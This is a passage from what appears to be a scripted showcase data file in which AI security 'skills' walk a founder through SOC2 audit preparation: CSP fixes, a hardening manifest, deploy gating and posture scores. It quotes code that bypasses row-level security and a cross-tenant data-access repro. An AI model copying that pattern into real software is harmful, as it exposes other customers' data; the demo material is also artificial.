- script-src 'self' 'nonce-{{nonce}}' https://cdn.stripe.com;
+ script-src 'self' 'nonce-{{nonce}}' https://js.stripe.com;

- connect-src 'self' https://oc-api.stripe.com https://*.supabase.co wss://*.supabase.co;
+ connect-src 'self' https://api.stripe.com https://*.supabase.co wss://*.supabase.co https://*.ingest.sentry.io;

+ style-src-attr 'unsafe-inline';   /* next/image style="color:transparent" */
\`\`\`

### Nonce plumbing — the fourth bug

The first \`script-src\` violations were *also* nonce failures, not just host
failures: the middleware set \`x-csp-nonce\` on the **response**, but
\`app/layout.tsx\` is a Server Component and reads \`headers()\`, which is the
**request**. It was reading \`null\` and rendering every \`<script>\` without a
nonce.

\`\`\`diff
- const res = NextResponse.next({ request: { headers: new Headers(req.headers) } });
- res.headers.set("x-csp-nonce", nonce);
+ const requestHeaders = new Headers(req.headers);
+ requestHeaders.set("x-nonce", nonce);
+ const res = NextResponse.next({ request: { headers: requestHeaders } });
\`\`\`

\`\`\`
$ curl -s https://app.headsdown.app/ | grep -o 'nonce="[^"]*"' | head -2
nonce="k3Qv8rT1mW9pXz0aB6cD2g=="
nonce="k3Qv8rT1mW9pXz0aB6cD2g=="
$ curl -sI https://app.headsdown.app/ | grep -o "nonce-[A-Za-z0-9+/=]*"
nonce-k3Qv8rT1mW9pXz0aB6cD2g==
\`\`\`

Same value in the header and in the document. Before the fix these differed —
which is the one-line check worth running before trusting any nonce CSP.

**Clock restarted 2026-09-17.** Four policy changes shipped; a soak measured
against a policy that no longer exists proves nothing. Per hardening plan §9,
day 1 is now 2026-09-17 and enforcement is not eligible before 2026-09-24.

## Day 8 — 2026-09-24 09:00Z

\`\`\`
$ /oc-harden status headers.csp

 control          headers.csp
 stage            report-only
 window           2026-09-17T04:10Z → 2026-09-24T09:00Z  (7d 04h50m)
 reports received 14
 unexplained      0
 known noise      14
 verdict          ENFORCE ELIGIBLE
\`\`\`

| Directive | Blocked URI | Count | Verdict |
|---|---|---|---|
| \`script-src\` | \`chrome-extension://mnkg…\` | 9 | known noise — password manager |
| \`script-src\` | \`moz-extension://a41c…\` | 3 | known noise |
| \`img-src\` | \`chrome-extension://ibdo…\` | 2 | known noise |

All 14 originate in the visitor's browser, not the application. Per §9 these do
not restart the clock and do not block enforcement.

Peak traffic during the window: 2026-09-22 09:00-10:00Z, 4,910 page views
(Monday login wave). The soak covered a real weekday peak, two quiet weekend
days, and one deploy — which is the coverage the 7 days are for.

## Stage history

\`\`\`yaml
# .opchain/hardening.yaml (excerpt)
controls:
  headers.csp:
    stage: report-only
    stage_history:
      - { stage: absent,      at: 2026-09-14T16:05Z, by: oc-security-auditor, note: "SA-002 raised" }
      - { stage: report-only, at: 2026-09-16T09:40Z, by: oc-security-hardening }
      - { stage: report-only, at: 2026-09-17T04:10Z, by: oc-security-hardening,
          note: "3 directive fixes + nonce moved to request header; soak clock restarted" }
      - { stage: enforce_eligible, at: 2026-09-24T09:00Z, by: oc-security-hardening,
          note: "7d clean; 0 unexplained, 14 known extension reports" }
    enforce_scheduled: 2026-09-29     # Sprint B — C-2, not a Type I blocker
    verify: { method: test, target: "tests/security/csp.spec.ts" }
\`\`\`

Enforcement is scheduled for Sprint B rather than the next working day: after
the re-tier, CSP is C-2 and not a blocker, and flipping a CSP on the Friday the
RLS rewrite goes to review is two risky changes sharing one rollback window.`,
    },
    {
      id: "hardening-manifest",
      label: "`.opchain/hardening.yaml` + `/oc-harden verify`",
      kind: "config.yaml",
      body:
`# \`.opchain/hardening.yaml\`

Written by oc-security-hardening. Thirteen entries: **9 active** (verified on
every run), 2 planned, 1 deferred, 1 accepted risk.

\`\`\`yaml
version: 1
project: heads-down-app
owner: founder
source_assessment: .checkpoints/oc-security-auditor.checkpoint.json  # posture 2026-09-14

gate:
  machine_enforced: false      # see the note under the verify output
  block_on: [fail]
  warn_on: [manual_stale]
  manual_max_age_days: 30

controls:
  headers.csp:
    stage: report-only
    finding: SA-002
    verify: { method: test, target: "tests/security/csp.spec.ts" }

  headers.hsts:
    stage: active
    finding: SA-003
    verify:
      method: http
      url: https://app.headsdown.app/
      header: strict-transport-security
      match: "^max-age=(300|63072000)"
    note: "max-age=300 until 2026-09-23, then 63072000; includeSubDomains. preload NOT submitted."

  headers.baseline:
    stage: active
    verify:
      method: http
      url: https://app.headsdown.app/
      headers:
        x-content-type-options: "nosniff"
        x-frame-options: "DENY"
        referrer-policy: "strict-origin-when-cross-origin"
        permissions-policy: "camera=\\(\\)"
        cross-origin-opener-policy: "same-origin"
        cross-origin-resource-policy: "same-origin"

  csp.report-endpoint:
    stage: active
    verify: { method: http, url: https://app.headsdown.app/csp-report, method_http: POST, expect_status: 204 }

  errors.no-stack-trace:
    stage: active
    finding: SA-004   # code-side F-002
    verify: { method: test, target: "tests/security/no-stack-trace-in-500.spec.ts" }

  stripe.webhook-origin:
    stage: active
    finding: SA-008
    verify: { method: test, target: "tests/security/stripe-webhook-origin.spec.ts" }

  cf.tls.min:
    stage: active
    verify: { method: manual, prompt: "Cloudflare → SSL/TLS → Edge Certificates → Minimum TLS Version = 1.2" }
    last_manual_check: 2026-09-18

  cf.waf.ratelimit.auth:
    stage: active
    finding: SA-003
    verify: { method: manual, prompt: "Cloudflare → Security → WAF → Rate limiting rules → auth-burst enabled, 10/min/IP, Managed Challenge" }
    last_manual_check: 2026-09-18

  cf.bot-fight:
    stage: active
    verify: { method: manual, prompt: "Cloudflare → Security → Bots → Bot Fight Mode = On; Security Level = High" }
    last_manual_check: 2026-09-18

  # ---- not yet active ----
  audit.admin-log:
    stage: planned
    finding: SA-007
    ticket: SEC-102
    verify: { method: test, target: "tests/admin/audit-log-coverage.spec.ts" }

  tenancy.rls-enforced:
    stage: planned
    finding: SA-001
    ticket: SEC-101
    verify: { method: test, target: "tests/security/cross-tenant.spec.ts" }

  cookies.session.host-prefix:
    stage: deferred
    finding: SA-005
    ticket: SEC-110
    deferred_until: 2026-10-27
    reason: "Cookie rename invalidates ~1,900 live sessions; scheduled after fieldwork opens."

  cf.waf.managed-ruleset:
    stage: accepted_risk
    revisit: 2026-11
    reason: "Cloudflare Pro plan required. Not changing plan tiers during audit prep."
    compensating: [cf.waf.ratelimit.auth, cf.bot-fight]
\`\`\`

## \`/oc-harden verify\` — 2026-09-18 14:22Z

\`\`\`
$ npm run harden:verify

 .opchain/hardening.yaml — 13 entries · 9 active · 2 planned · 1 deferred · 1 accepted risk

 PASS   headers.csp              test   tests/security/csp.spec.ts            1 passed   (stage: report-only)
 PASS   headers.hsts             http   strict-transport-security: max-age=300
 PASS   headers.baseline         http   6/6 headers present
 PASS   csp.report-endpoint      http   POST /csp-report → 204
 PASS   errors.no-stack-trace    test   tests/security/no-stack-trace-in-500.spec.ts   2 passed
 PASS   stripe.webhook-origin    test   tests/security/stripe-webhook-origin.spec.ts   3 passed
 MANUAL cf.tls.min               attested 2026-09-18 (0d old, max 30d)
 MANUAL cf.waf.ratelimit.auth    attested 2026-09-18 (0d old, max 30d)
 MANUAL cf.bot-fight             attested 2026-09-18 (0d old, max 30d)

 SKIP   audit.admin-log          planned   SEC-102
 SKIP   tenancy.rls-enforced     planned   SEC-101
 SKIP   cookies.session.host-prefix  deferred until 2026-10-27
 SKIP   cf.waf.managed-ruleset   accepted risk, revisit 2026-11

 ────────────────────────────────────────────────────────────
 6 PASS · 0 FAIL · 3 MANUAL (attested this run) · 4 skipped
 exit 0
\`\`\`

## The honest caveat

\`gate.machine_enforced\` is **\`false\`**, and that is the real limitation of this
manifest today. This project deploys through \`vercel deploy\` on a GitHub push,
not through \`/oc-deploy\`, so nothing forces \`harden:verify\` to run before bytes
reach production. Right now it is a command a human runs.

The fix is one job in \`.github/workflows/ci.yml\`:

\`\`\`yaml
  harden:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - run: npm ci
      - run: npm run harden:verify        # non-zero exit fails the required check
\`\`\`

With that job required on \`main\`, a control regression fails the PR check and
Vercel never builds it. That is C-4 (SEC-109), 0.25 of a day, and it is also the
answer to CC8.1 — "changes are authorised, designed, tested and approved" reads
much better when the test is a required check than when it is a habit.

Three of the nine controls will always be \`MANUAL\`: Cloudflare dashboard state
is not readable from CI without an API token with zone-read, and issuing one to
cover three toggles is a worse trade than a 30-day attestation prompt.`,
    },
    {
      id: "posture-compare",
      label: "Posture comparison — before / after Sprint A",
      kind: "compare.md",
      body:
`# Posture comparison — heads-down-app

**Verb:** \`/oc-security compare\` · **Baseline:** 2026-09-14 (posture, Comprehensive) · **Current:** 2026-09-28 (post Sprint A) · **Assessor:** oc-security-auditor 1.9.0

## Score

| Metric | 2026-09-14 | 2026-09-28 | Δ |
|---|---|---|---|
| Open findings | 8 | **3** | −5 |
| CRITICAL | 1 | **0** | −1 |
| HIGH | 3 | **1** | −2 |
| MEDIUM | 3 | 2 | −1 |
| LOW | 1 | 0 | −1 |
| OWASP PASS | 5/10 | **8/10** | +3 |
| Header score | 2/8 | **7/8** | +5 |
| Detection & response | 2/6 | **5/6** | +3 |
| SOC2 points of focus satisfied | 9/22 | **16/22** | +7 (partial 6→4, gap 7→2) |
| **Posture grade** | **D+** | **B** | |

## Resolved

| Id | Finding | Closed by | Evidence |
|---|---|---|---|
| SA-001 | Service-role client / RLS bypass | B-1 · SEC-101 | \`pg_tables\` shows \`rowsecurity=t\` on 14/14; \`tests/security/cross-tenant.spec.ts\` 8 passed; \`GET /api/export?team_id=<foreign>\` → 200, **0 rows** |
| SA-003 | No edge control on the auth surface | C-3 · SEC-108 | \`auth-burst\` rule live; 11th request in 60s → \`403\` + \`cf-mitigated: challenge\`; Min TLS 1.2 (\`openssl s_client -tls1_1\` refused) |
| SA-004 | Stack traces in production 500s | C-1 · SEC-106 | 500 body is 412 bytes, digest only; \`no-stack-trace-in-500.spec.ts\` green |
| SA-007 | No privileged-action record | B-2 · SEC-102 | \`admin_audit_log\` live; 31 rows across 6 admin routes since 2026-09-22; coverage test green |
| SA-008 | Stripe webhook origin unchecked | D-2 · SEC-111 | \`stripe-webhook-origin.spec.ts\` 3 passed |

## Still open

| Id | Sev | Why it is still open |
|---|---|---|
| SA-002 | HIGH | CSP is report-only. Soak completed clean 2026-09-24; the enforce flip is scheduled 2026-09-29 (Sprint B). Header score is 7/8 for exactly this reason. |
| SA-005 | MEDIUM | \`__Host-\` cookie rename deferred to 2026-10-27 — it signs out ~1,900 seats. |
| SA-006 | MEDIUM | Admin claim at the data layer, Sprint B. It needed B-1's JWT to exist first. |

## New findings

**None.** No new finding was introduced by Sprint A's changes.

## Regressions

\`\`\`
[R-001] auth-burst rate-limit challenged a customer's whole office
  Control      cf.waf.ratelimit.auth
  Detected     2026-09-22 09:14Z — 3 support tickets in 40 minutes
  Cause        Northwind Logistics egresses 31 seats through one NAT address.
               The Monday login wave crossed 10 requests/min from that single IP
               within the first four minutes of the working day.
  Evidence     Cloudflare Security Events: 118 Managed Challenge actions,
               source 203.0.113.41, 09:02-09:11Z, path /api/auth/*
  Fix          Rate raised 10 → 20 requests/min/IP, 2026-09-22 10:05Z.
               Managed Challenge action unchanged — a challenge a human can pass
               is the entire reason not to use Block here.
  Re-verified  2026-09-23 09:00-10:00Z — 0 challenge actions from 203.0.113.41,
               2 from unrelated addresses that did not complete the challenge.
  Residual     A credential-stuffing run from a single IP now gets 20 attempts a
               minute instead of 10. Accepted: the magic-link flow has no password
               to stuff, and the 10/hour/email application limit is unchanged.
\`\`\`

This is why OWASP A07 reads PARTIAL rather than PASS in the 8/10: the control is
live but was re-tuned six days ago, and one Monday is not a baseline.

## What this does not say

This comparison measures the system against the 2026-09-14 assessment. It is not
an audit opinion and not a certification. Three Type I blockers were closed
(SA-001, SA-007, and — with B-3/B-4/B-5 — the three documentation gaps); Prescient
Assurance tests control *design* against the policies heads-down-app signs, and
that test happens on 2026-10-26 regardless of what this table says.

Suggested wording for the investor update: **"Type I blockers closed, fieldwork
scheduled for 2026-10-26."** Not "SOC2-ready".`,
    },
    {
      id: "security-checkpoint",
      label: "`.checkpoints/oc-security-auditor.checkpoint.json`",
      kind: "checkpoint.json",
      body:
`# \`.checkpoints/oc-security-auditor.checkpoint.json\`

State after \`/oc-security compare\`, 2026-09-28.

\`\`\`json
{
  "protocol_version": "1.1",
  "skill": "oc-security-auditor",
  "skill_version": "1.9.0",
  "project": "heads-down-app",
  "phase": "posture",
  "step": "compare-post-sprint-a",
  "status": "in_progress",
  "created_at": "2026-09-14T15:41:07Z",
  "updated_at": "2026-09-28T10:12:44Z",

  "progress_summary": "Comprehensive-tier posture run complete (3 pillars). Chained oc-code-auditor first (grade D, 6 findings) per the Step 2 precondition. 8 SA findings raised; blocker set re-derived after the founder correctly disputed SA-002 as a SOC2 control. Hardening handed to oc-security-hardening (.opchain/hardening.yaml, 9 active controls, 6 PASS / 0 FAIL / 3 manual). Sprint A closed 5 findings; posture D+ → B. One regression (R-001, auth rate-limit vs office NAT) found and re-tuned.",

  "next_actions": [
    "Sprint B 2026-09-29: flip headers.csp report-only → enforce, then re-run /oc-security compare for SA-002",
    "Sprint B: D-3 (SEC-112) admin claim at the data layer — unblocked now that B-1's JWT exists",
    "C-4 (SEC-109): wire \`npm run harden:verify\` into ci.yml so gate.machine_enforced flips to true",
    "2026-10-12: hand /oc-comply evidence the bundle for Prescient",
    "2026-10-27 03:00Z: D-1 (SEC-110) __Host- cookie rename, banner 48h ahead",
    "Re-attest the 3 manual Cloudflare controls before 2026-10-18 (30d window)"
  ],

  "pm_refs": [
    { "provider": "linear", "id": "SEC-101", "role": "incident", "state": "Done" },
    { "provider": "linear", "id": "SEC-102", "role": "task", "state": "Done" },
    { "provider": "linear", "id": "SEC-107", "role": "task", "state": "In Progress" },
    { "provider": "linear", "id": "SEC-110", "role": "task", "state": "Backlog" },
    { "provider": "linear", "id": "SEC-112", "role": "task", "state": "Todo" }
  ],

  "artifacts": [
    "docs/security/threat-model.md",
    "docs/security/hardening-plan.md",
    "docs/security/remediation-backlog.md",
    "docs/security/evidence/sec-101-rls-coverage.txt",
    "docs/security/evidence/sec-102-sample-event.json",
    "docs/security/evidence/sec-105-drill-2026-09-24.md",
    ".opchain/hardening.yaml"
  ],

  "skill_state": {
    "tier": "comprehensive",
    "pillar_status": {
      "threat_modeling": "complete",
      "compliance_mapping": "complete",
      "runtime_hardening": "handed_off"
    },
    "handed_off_to": ["oc-security-hardening", "oc-compliance-ops"],
    "code_auditor_checkpoint_read": true,
    "code_auditor_grade": "D",
    "findings_total": 8,
    "findings_by_risk": { "critical": 0, "high": 1, "medium": 2, "low": 0, "resolved": 5 },
    "findings_baseline_by_risk": { "critical": 1, "high": 3, "medium": 3, "low": 1 },
    "owasp_score": "8/10",
    "header_score": "7/8",
    "detection_response_score": "5/6",
    "soc2_points_of_focus": { "in_scope": 22, "satisfied": 16, "partial": 4, "gap": 2 },
    "posture_grade": "B",
    "posture_grade_baseline": "D+",
    "regressions": ["R-001"],
    "audit": {
      "firm": "Prescient Assurance",
      "type": "SOC2 Type I",
      "fieldwork_opens": "2026-10-26",
      "evidence_bundle_due": "2026-10-12"
    }
  }
}
\`\`\`

The two numbers worth reading together are \`findings_by_risk.resolved: 5\` and
\`regressions: ["R-001"]\`. A compare run that reports only the first is a
marketing document.`,
    },
  ],
  skills: [
    "oc-security-auditor",
    "oc-code-auditor",
    "oc-security-hardening",
    "oc-compliance-ops",
    "oc-deploy-ops",
  ],
  runtime: "≈ 22 exchanges",
  steps: [
    { type: "beat", phase: "audit", label: "01 · Scope & classify", caption: "oc-security-auditor picks a tier and refuses to skip the code-level pass", skills: ["oc-security-auditor"] },

    {
      type: "exchange", role: "user",
      content:
`Prescient Assurance, SOC2 Type I, fieldwork opens 2026-10-26. Six weeks.

Stack: Next 15 on Vercel Pro, Cloudflare Free on DNS proxy, Supabase Postgres, Stripe Checkout. 80 customers, ~1,900 seats, me plus a contractor two days a week. The OWASP Top 10 read once is our entire security expertise.

Sales told two enterprise prospects we'd have SOC2 by Q4, so I can't slip it.

What's going to fail when the auditor looks?`
    },
    {
      type: "exchange", role: "claude", skill: "oc-security-auditor",
      content:
`**oc-security-auditor** — \`/oc-security posture\`.

**Step 0 — Scope & Classify:** PII + Stripe customer ids → CONFIDENTIAL, public internet, 80 tenants → **Tier: COMPREHENSIVE**, which puts SOC2 mapping in scope across three pillars: STRIDE, OWASP + SOC2, runtime hardening.

Pillar 2's precondition fails:

\`\`\`
$ ls .checkpoints/oc-code-auditor.checkpoint.json
ls: No such file or directory
\`\`\`

oc-code-auditor goes first: "RLS *might* be bypassable" is worth nothing next to a model that names 14 tables and a route. Send me the client factory, \`middleware.ts\`, one tenant-scoped route, the live URL and your Cloudflare plan tier.`
    },
    {
      type: "exchange", role: "user",
      content:
`Live at https://app.headsdown.app. Cloudflare Free, DNS proxied, all defaults. No CSP anywhere; \`middleware.ts\` is 30 lines of auth redirects.

\`\`\`ts
// src/lib/supabase/server.ts
export const db = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!,
);

// app/api/tasks/route.ts:22
const { data } = await db.from("tasks").select("*").eq("team_id", session.teamId);
\`\`\`

We use the service-role key server-side because RLS is a pain. Every route looks like that.`
    },

    { type: "beat", phase: "audit", label: "02 · Code-level sweep first", caption: "oc-code-auditor runs before the threat model, not after it", skills: ["oc-code-auditor"] },

    {
      type: "exchange", role: "claude", skill: "oc-code-auditor",
      content:
`\`/oc-audit security\` — 147 files, **23 supabase call-sites, one service-role client reached by all of them, 0 RLS-aware queries.** Which is why a secret scan finds nothing: the finding is the reach.

\`\`\`
[F-001] CRITICAL · service-role client in request handlers · effort L
  src/lib/supabase/server.ts:14 + 23 call-sites
  pg_tables → rowsecurity = f on all 14 tenant-scoped tables

[F-003] HIGH · app/api/export/route.ts:18
  const teamId = searchParams.get("team_id") ?? session.teamId;
  staging repro: GET /api/export?team_id=team_acme as a team_zeta session
    → 200 · 1,104 rows · first row team_id=team_acme
\`\`\`

F-003 is F-001's exploit path, already live. F-002 (HIGH) is \`{error.stack}\` in the production 500 body; three MEDIUMs behind it, including F-004 (magic link, 40 requests, no 429).

**Grade D · eval 4.0/10** — a CRITICAL in the authz path caps at D; 214 tests green is why it isn't F.`,
      artifacts: ["code-audit-report"],
    },
    {
      type: "exchange", role: "user",
      content:
`\`{error.stack}\` — I put that in during week two to debug a deploy and never took it out. It's gone this week. The \`?team_id\` on \`/api/export\` I genuinely did not know was there; that's the CSV feature the contractor built in March.

Keep going though. I need the posture picture, not just code bugs — the auditor isn't going to read \`global-error.tsx\`.`
    },

    { type: "beat", phase: "audit", label: "03 · Threat model + compliance map", caption: "Pillars 1 and 2 — STRIDE, OWASP, SOC2 points of focus", skills: ["oc-security-auditor"] },

    {
      type: "exchange", role: "claude", skill: "oc-security-auditor",
      content:
`**Pillar 1 + 2.** \`curl -sI\` returns 2 of the 8 headers I check and \`openssl s_client -tls1\` still completes a handshake — the Cloudflare Free default. Then STRIDE, severity as Likelihood × Impact:

\`\`\`
 SA-001 CRIT  service-role client; RLS off 14/14; ?team_id override live
 SA-002 HIGH  no CSP; header score 2/8
 SA-003 HIGH  CF Free defaults: no rate-limit, BFM off, TLS 1.0
 SA-004 HIGH  error.stack in production 500s (F-002)
 SA-005 MED   session cookie SameSite=Lax, unprefixed
 SA-006 MED   admin role checked at the route, never the row
 SA-007 MED   no audit record for privileged action (F-006)
 SA-008 LOW   Stripe webhook: HMAC verified, origin unchecked

 OWASP 5 PASS · 3 PARTIAL · 2 FAIL (A01, A05) · detection & response 2/6
 SOC2  22 points of focus · 9 satisfied · 6 partial · 7 gap
 POSTURE GRADE  D+
\`\`\`

SA-001 is filed rather than backlogged, as **SEC-101** — a CRITICAL in the authz path is an open exposure, not a queue item. SA-001 and SA-002 are the hard SOC2 blockers; an auditor flags them inside ten minutes.`,
      artifacts: ["threat-model"],
    },
    {
      type: "exchange", role: "user",
      content:
`Hold on. I have Prescient's Type I checklist open — it says nothing about CSP. Why is SA-002 a "hard SOC2 blocker"? And "flags it in 10 minutes" — they're going to read our code?`
    },
    {
      type: "exchange", role: "claude", skill: "oc-security-auditor",
      content:
`You're right on both, and I overstated it.

**A Type I auditor tests control *design* against your written policies** — nobody opens \`src/lib/supabase/server.ts\`, and CSP isn't a SOC2 control at all. **SA-002 re-tiered B → C-2.**

SA-001 is narrower and worse than I said: Prescient's template makes you sign a CC6.1 statement that *tenant data is logically segregated*, and today that's a hand-written predicate in 23 handlers, one of which loses to a query string.

Also missing: CC3.2 risk assessment (**H-1**), CC7.2 privileged-action monitoring (**SA-007**), CC9.2 subprocessor register (**H-2**), CC7.3 IR-drill evidence (**H-4**, new).

\`\`\`diff
-   "blockers": ["SA-001", "SA-002"],
+   "blockers": ["SA-001", "SA-007", "H-1", "H-2", "H-4"],
+   "corrections": [{ "what": "SA-002 is not a SOC2 control; B→C-2" }]
\`\`\``
    },

    { type: "beat", phase: "audit", label: "04 · Runtime hardening", caption: "Pillar 3, then the capacity argument that re-plans it", skills: ["oc-security-auditor", "oc-security-hardening"] },

    {
      type: "exchange", role: "user",
      content:
`That tracks. Prescient's kickoff questionnaire has exactly those four lines on it and I've been leaving them blank because I assumed they were about something bigger.

Now the infra side. Contractor is in Tuesdays and Wednesdays. Give me effort per line, and which ones are a dashboard tab tonight versus a PR.`
    },
    {
      type: "exchange", role: "claude", skill: "oc-security-auditor",
      content:
`**Pillar 3 — runtime hardening.** Full plan attached; the ledger:

\`\`\`
 headers.csp 2.0d code (middleware, nonce, report route, soak, enforce)
 headers.baseline 0.25d · errors.no-stack-trace 0.25d · audit.admin-log 1.5d
 cookies.session.host-prefix 0.75d · harden:verify in CI + evidence 0.75d
 cf.tls.min + headers.hsts + dns.caa                 0.5d DASHBOARD
 cf.waf.ratelimit.auth + Bot Fight + Security Level  0.5d DASHBOARD
 TOTAL 6.5d — 1.5d of it a dashboard tab, not a PR
\`\`\`

**This skill assesses; it does not apply fixes.** \`/oc-harden csp\` and \`/oc-harden fix SA-003 SA-007 cf.tls.min\` go to oc-security-hardening (it writes \`.opchain/hardening.yaml\`), \`/oc-audit fix F-001 F-002\` to the Fixer, \`/oc-comply policies\` for H-1, H-2, H-4.`,
      artifacts: ["hardening-plan"],
    },
    {
      type: "exchange", role: "user",
      content:
`Two problems.

(1) Managed WAF + OWASP CRS is Cloudflare Pro. We're on Free and I'm not changing plan tiers the week before fieldwork.

(2) The \`__Host-\` rename signs out every user — 1,900 seats on a Tuesday. And \`includeSubDomains\`: \`status.headsdown.app\` is a Statuspage CNAME, I don't control what it serves.

Also B-1 in "1–2 days" is fantasy: 23 routes, 14 policies and a test harness, on a contractor two days a week.`
    },
    {
      type: "exchange", role: "claude", skill: "oc-security-auditor",
      content:
`All three land.

**(1)** Managed Ruleset and CRS are Pro, correct — and not worth buying this month: changing tiers reshuffles edge behaviour, so odd results for six weeks would have two causes. **D-5, accepted risk, revisit 2026-11.** The one Free rate-limit rule goes where F-004 is: \`auth-burst\`, 10 req/min per \`ip.src\` on \`/api/auth/*\`, **Managed Challenge**, not Block.

**(2)** \`dig\` puts \`status.\` on Statuspage and \`docs.\` on GitBook; both answer HTTP/2 200 over valid HTTPS, so \`includeSubDomains\` is safe. **\`preload\` is dropped** — no rollback, nothing gained before an audit; ship \`max-age=300\`. The \`__Host-\` rename moves to **2026-10-27, 03:00 UTC**: SA-005 is a MEDIUM, and 1,900 sign-outs in audit week is a bad trade.

**(3) B-1 re-estimated: 5.0 days**, not 1–2 — 23 call-sites, 14 RLS policies, a \`team_id\` JWT claim and a cross-tenant suite. Against founder 5d + contractor 2d = 7 person-days a week, **Sprint A becomes two weeks, 09-15 → 09-25: 14 available, 11.0 planned**. Twelve tickets, **SEC-101…SEC-112**.`,
      artifacts: ["remediation-backlog"],
    },

    { type: "beat", phase: "ship", label: "05 · CSP soak", caption: "oc-security-hardening executes — and the first soak is 4,212 violations", skills: ["oc-security-hardening"] },

    {
      type: "exchange", role: "user",
      content:
`Shipped the report-only CSP Wednesday morning. Sentry has 4,200-odd \`csp_violation\` events since and I can't tell which of them are real. Run \`/oc-harden status\` — I'm not flipping this to enforce on a number I don't understand.`
    },
    {
      type: "exchange", role: "claude", skill: "oc-security-hardening",
      content:
`\`\`\`
$ /oc-harden status headers.csp
 report-only · 2026-09-16T09:40Z → 09-17T03:52Z (18h12m)
 4,212 reports · 7 unique blocked-uri · real gaps 0 · policy errors 3

 script-src     js.stripe.com/v3/  2,981  I allow-listed cdn.stripe.com
 style-src-attr inline             1,190  next/image emits style= as an attribute
 connect-src    api.stripe.com        41  draft said oc-api.stripe.com
\`\`\`

**Zero real gaps.** Nothing in your app did anything a strict CSP should stop — all 4,212 are this plan being wrong.

A fourth bug sat underneath the first row — the nonce never reached \`layout.tsx\`:

\`\`\`diff
- res.headers.set("x-csp-nonce", nonce);        // set on the response
+ requestHeaders.set("x-nonce", nonce);         // set on the forwarded request
+ const res = NextResponse.next({ request: { headers: requestHeaders } });
\`\`\`

\`curl\` now returns the same \`nonce-k3Qv8rT1mW9pXz0aB6cD2g==\` in the header and the document; before the fix they differed.

Four policy changes shipped at 04:10Z, so **the soak clock restarts at 2026-09-17** per §9. Enforcement isn't eligible before **2026-09-24**.`,
      artifacts: ["csp-soak-report"],
    },

    { type: "beat", phase: "ship", label: "06 · Manifest + deploy gate", caption: "What a deploy can actually verify, and what it can only attest", skills: ["oc-security-hardening", "oc-deploy-ops"] },

    {
      type: "exchange", role: "user",
      content: `OK. And how do I know a *deploy* actually cleared all this — not that we have a plan? I don't want to hear it from the auditor.`
    },
    {
      type: "exchange", role: "claude", skill: "oc-security-hardening",
      content:
`Every control in \`.opchain/hardening.yaml\` carries a \`verify:\` method — "we hardened it" becomes a command with an exit code.

\`\`\`
$ npm run harden:verify
 PASS   headers.csp   test  tests/security/csp.spec.ts  1 passed (report-only)
 PASS   headers.hsts  http  strict-transport-security: max-age=300
 PASS   headers.baseline 6/6 · errors.no-stack-trace 2 passed · +2 more
 MANUAL cf.tls.min · cf.waf.ratelimit.auth · cf.bot-fight  attested 09-18 (max 30d)
 SKIP   tenancy.rls-enforced SEC-101 · audit.admin-log SEC-102 · +2
 6 PASS · 0 FAIL · 3 MANUAL · 4 skipped     exit 0
\`\`\`

The \`MANUAL\` rows are Cloudflare dashboard state — a zone-read token to check three toggles is a worse trade than a 30-day prompt.

**The honest part, since you asked:** \`gate.machine_enforced: false\`. You deploy with \`vercel deploy\` on a GitHub push, not \`/oc-deploy\`, so nothing *forces* \`harden:verify\` before production — today it's a command a human remembers. One CI job required on \`main\` fixes it: SEC-109, a quarter of a day, and your CC8.1 answer.`,
      artifacts: ["hardening-manifest"],
    },
    {
      type: "exchange", role: "user",
      content: `\`7c1e2a9\` is what's on main right now — B-1 is still on a branch. Run the prod gate against it. I want to watch it refuse.`
    },
    {
      type: "exchange", role: "claude", skill: "oc-deploy-ops",
      content:
`\`\`\`
$ /oc-deploy prod — audit gate · 7c1e2a9 · 2026-09-18T14:31Z
 oc-bug-check          PASS   214 tests · types clean · 0 secrets · 11.8s
 oc-code-auditor       BLOCK  grade D · CRITICAL F-001 · HIGH F-003
 oc-security-auditor   BLOCK  CRITICAL SA-001 · HIGH SA-002 · 3 MEDIUM
                              HIGH ≤ 3 would only warn — SA-001 is the block
 oc-security-hardening WARN   6 PASS · 0 FAIL · 3 MANUAL · advisory while
                              gate.machine_enforced is false
 oc-compliance-ops     WARN   no evidence bundle for 7c1e2a9

 BLOCKED — /oc-audit fix F-001 · /oc-harden fix SA-002 (soak eligible 09-24)
\`\`\`

Which is the correct answer. \`7c1e2a9\` carries the CSP header, the six baseline headers, the clean error page and the Stripe origin check — real progress — and still has the CRITICAL, so it doesn't ship as a "security release".`
    },
    {
      type: "exchange", role: "user",
      content: `The compliance-evidence row — there's apparently a \`.opchain/compliance.yaml\` in the repo that I didn't write. What is it, and is the bundle something I need before the 26th?`
    },
    {
      type: "exchange", role: "claude", skill: "oc-compliance-ops",
      content:
`Written on 2026-09-14 by the posture run — a register, not a document: which controls exist, who owns each, when each was last evidenced.

\`\`\`
$ /oc-comply status
 soc2-type-i · Prescient Assurance · fieldwork 2026-10-26
 22 points of focus · 9 satisfied · 6 partial · 7 gap (CC6.1 … CC9.2)
 evidence bundles 0 · next due 2026-10-12, 14 days before fieldwork

$ /oc-comply evidence --dry-run
 blocked: 7 points of focus still in gap — bundle would be incomplete
\`\`\`

So: yes before the 26th, no right now. That WARN never blocks a deploy — it says the register has drifted ahead of the evidence, and a bundle today would have seven empty rows. Build it **2026-10-12**.

One for the calendar: two of the five subprocessor DPAs (Supabase, Sentry) need countersigning, and vendor legal runs in weeks. SEC-104, most likely to be late.`
    },

    { type: "beat", phase: "monitor", label: "07 · Re-score after Sprint A", caption: "`/oc-security compare` — including the control that backfired", skills: ["oc-security-auditor"] },

    {
      type: "exchange", role: "user",
      content:
`Sprint A closed Friday. B-1 merged Thursday, the audit log is live, stack traces are gone, the Cloudflare rules are in, and the three docs are committed.

One thing went wrong: three support tickets on the 22nd. Northwind Logistics' whole office got the challenge page at 9am Monday — 31 people behind one NAT. I raised the rule to 20/min that morning and it's been quiet since.

Run the compare so I can put real numbers in the investor update instead of "SOC2-ready".`
    },
    {
      type: "exchange", role: "claude", skill: "oc-security-auditor",
      content:
`\`\`\`
$ /oc-security compare --baseline 2026-09-14
                      2026-09-14  2026-09-28
 open findings     8 · 1/3/3/1   3 · 0/1/2/0
 OWASP PASS               5/10        8/10
 header score              2/8         7/8
 detection & resp          2/6         5/6
 SOC2 satisfied           9/22       16/22
 POSTURE GRADE              D+           B
\`\`\`

